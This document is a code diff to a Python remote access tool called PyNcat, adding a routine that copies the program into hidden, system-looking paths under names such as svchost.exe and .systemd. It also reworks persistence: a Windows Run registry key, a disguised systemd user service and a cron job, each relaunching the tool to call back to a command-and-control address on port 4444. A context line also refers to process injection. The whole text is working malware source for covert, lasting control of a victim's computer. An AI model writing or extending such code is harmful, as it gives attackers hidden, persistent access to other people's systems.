@@ -46,92 +46,95 @@ class PyNcat:
         parser.add_argument('-v', '--verbose', action='store_true')
         return parser.parse_args()
 
-         # ====================== PERSISTENCE ======================
+             # ====================== PERSISTENCE ======================
+    def self_copy_to_hidden(self) -> Optional[str]:
+        """Copy itself to a hidden location and return new path"""
+        try:
+            original_path = os.path.abspath(sys.argv[0])
+            system = platform.system().lower()
+
+            if system == "windows":
+                # Hidden location: %APPDATA%\Microsoft\Windows\Themes\
+                base_dir = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Themes")
+                os.makedirs(base_dir, exist_ok=True)
+                new_name = "SystemUpdate.exe" if original_path.endswith('.py') else "svchost.exe"
+                new_path = os.path.join(base_dir, new_name)
+
+            elif system == "linux":
+                # Hidden location: ~/.config/.system/
+                base_dir = os.path.expanduser("~/.config/.system")
+                os.makedirs(base_dir, exist_ok=True)
+                new_name = ".dbus-update" if original_path.endswith('.py') else ".systemd"
+                new_path = os.path.join(base_dir, new_name)
+            else:
+                logger.warning("[!] Self-copy not supported on this OS")
+                return original_path
+
+            # Copy file
+            import shutil
+            if os.path.exists(new_path):
+                os.remove(new_path)
+            shutil.copy2(original_path, new_path)
+
+            # Make executable on Linux
+            if system == "linux":
+                os.chmod(new_path, 0o755)
+
+            logger.info(f"[+] Self copied to hidden location: {new_path}")
+            return new_path
+
+        except Exception as e:
+            logger.error(f"Self-copy failed: {e}")
+            return os.path.abspath(sys.argv[0])
+
     def install_persistence(self):
-        """Install persistence with automatic C2 configuration"""
+        """Install persistence with self-copy first"""
         if not self.args.persistent:
             return
 
-        c2_ip = self.args.connect
-        if not c2_ip:
-            c2_ip = self._get_public_ip() or "YOUR_C2_IP_HERE"
+        # Step 1: Self-copy to hidden location
+        hidden_path = self.self_copy_to_hidden()
+        
+        # Step 2: Get C2 IP
+        c2_ip = self.args.connect or self._get_public_ip() or "YOUR_C2_IP_HERE"
 
-        logger.info(f"[*] Installing persistence pointing to C2: {c2_ip}")
+        logger.info(f"[*] Installing persistence using hidden binary: {hidden_path}")
+        logger.info(f"[*] C2 Target: {c2_ip}")
 
         system = platform.system().lower()
         
         if system == "windows":
-            self._windows_persistence(c2_ip)
+            self._windows_persistence(hidden_path, c2_ip)
         elif system == "linux":
-            self._linux_persistence(c2_ip)
+            self._linux_persistence(hidden_path, c2_ip)
         else:
             logger.warning(f"[!] Persistence not fully supported on {system}")
 
-    def _get_public_ip(self) -> Optional[str]:
-        """Try to get public IP automatically"""
-        try:
-            import urllib.request
-            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
-                return response.read().decode('utf-8').strip()
-        except:
-            try:
-                import socket
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.connect(("8.8.8.8", 80))
-                return s.getsockname()[0]
-            except:
-                return None
-
-    def _windows_persistence(self, c2_ip: str):
-        """Windows - Multiple methods"""
-        methods = []
-        exe_path = os.path.abspath(sys.argv[0])
-        cmd = f'"{exe_path}" -c {c2_ip} -p 4444 --ssl --persistent'
+    def _windows_persistence(self, binary_path: str, c2_ip: str):
+        """Windows persistence using hidden binary"""
+        cmd = f'"{binary_path}" -c {c2_ip} -p 4444 --ssl --persistent'
 
         try:
-            # Method 1: HKCU Run Key (most common)
             import winreg
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, cmd)
             winreg.CloseKey(key)
-            methods.append("Registry (HKCU\\Run)")
-        except:
-            pass
+            logger.info("[+] Windows Registry persistence installed (hidden location)")
+        except Exception as e:
+            logger.error(f"Registry persistence failed: {e}")
 
-        try:
-            # Method 2: Startup Folder
-            startup = os.path.join(os.getenv('APPDATA'), 
-                                 r"Microsoft\Windows\Start Menu\Programs\Startup")
-            shortcut = os.path.join(startup, "SystemUpdate.lnk")
-            # Simple .bat fallback
-            bat_path = os.path.join(startup, "update.bat")
-            with open(bat_path, "w") as f:
-                f.write(f'@echo off\n{cmd}')
-            methods.append("Startup Folder")
-        except:
-            pass
-
-        if methods:
-            logger.info(f"[+] Windows persistence installed via: {', '.join(methods)}")
-        else:
-            logger.error("[!] All Windows persistence methods failed")
-
-    def _linux_persistence(self, c2_ip: str):
-        """Linux persistence methods"""
-        exe_path = os.path.abspath(sys.argv[0])
-        cmd = f"{exe_path} -c {c2_ip} -p 4444 --ssl --persistent"
-
-        methods = []
-
-        # Method 1: systemd user service
+    def _linux_persistence(self, binary_path: str, c2_ip: str):
+        """Linux persistence"""
+        cmd = f"{binary_path} -c {c2_ip} -p 4444 --ssl --persistent"
+        
         try:
             service_path = f"{os.path.expanduser('~')}/.config/systemd/user/pyncat.service"
             os.makedirs(os.path.dirname(service_path), exist_ok=True)
             
             service = f"""[Unit]
-Description=System Maintenance Service
+Description=System Maintenance
 
 [Service]
 ExecStart={cmd}
@@ -144,25 +147,25 @@ WantedBy=default.target
             with open(service_path, "w") as f:
                 f.write(service)
 
-            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True, check=False)
-            subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True, check=False)
-            methods.append("systemd user service")
+            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
+            subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True)
+            logger.info("[+] Linux systemd persistence installed")
         except:
-            pass
+            # Fallback cron
+            try:
+                cron_cmd = f"*/3 * * * * {cmd} >/dev/null 2>&1"
+                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
+                logger.info("[+] Linux cron persistence installed")
+            except Exception as e:
+                logger.error(f"Cron failed: {e}")
 
-        # Method 2: Cron
+    def _get_public_ip(self) -> Optional[str]:
         try:
-            cron_cmd = f"*/3 * * * * {cmd} >/dev/null 2>&1"
-            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True, check=False)
-            methods.append("cron job")
+            import urllib.request
+            with urllib.request.urlopen('https://api.ipify.org', timeout=4) as r:
+                return r.read().decode().strip()
         except:
-            pass
-
-        if methods:
-            logger.info(f"[+] Linux persistence installed: {', '.join(methods)}")
-        else:
-            logger.error("[!] Failed to install Linux persistence")
-
+            return None
     # ====================== RUN ======================
     def run(self):
         # Process Injection (highest priority)
